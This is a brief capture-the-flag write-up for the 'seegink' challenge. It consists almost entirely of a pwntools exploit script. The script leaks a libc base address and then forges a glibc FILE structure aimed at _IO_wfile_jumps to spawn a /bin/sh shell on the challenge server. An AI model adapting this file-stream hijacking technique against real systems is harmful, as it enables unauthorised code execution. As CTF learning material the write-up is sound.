# TJ Cybersec Winter CTF

Smol ctf

seegink:

```python
from pwn import *

e = ELF("./seegink")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.29.so")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([e.path])
p = remote("winter-challenge.tjcsec.club", 30001)

#context.log_level="debug"
gdb.attach(p, """break * puts
           break * _IO_wfile_sync
           c""")


p.sendlineafter("ginkoid: ", "-6")  # reads ptrs from stdout

p.recvline()

p.recv(6)

libc.address = u64(p.recv(8)) - 0x1e57e3


print("libc base", hex(libc.address))


# point _IO_wide_data to start of stdout's ptrs (+8*2 to skip past the flags in the beginning of FILE)

print("libc stdout", hex(libc.sym["_IO_2_1_stdout_"]))

# lol
fstruct = p16(0xfbad) + p32(0) + p64(libc.address + 0x1e57e4) + p64(libc.address + 0x1e57e3) * 6 +\
    p64(libc.address + 0x1e57e4) + p64(0)*4 + p64(libc.address + 0x1e4a00) +\
    p64(1) + p64(0xffffffffffffffff) + p64(0x0a000000) +\
    p64(libc.address + 0x1e7580) + p64(0xffffffffffffffff) + p64(libc.sym["_IO_2_1_stdout_"]+0xe0) +\
    p64(libc.sym["_IO_2_1_stdout_"]+8) + p64(0)*3 + p64(0xffffffff) + p64(0)*2 +\
    p64(libc.sym["_IO_wfile_jumps"]+5*8)


fstruct += "/bin/sh;" + p64(0)*3 + p64(libc.sym["system"])


p.sendafter("ginkoid: ", fstruct)



p.interactive()
```
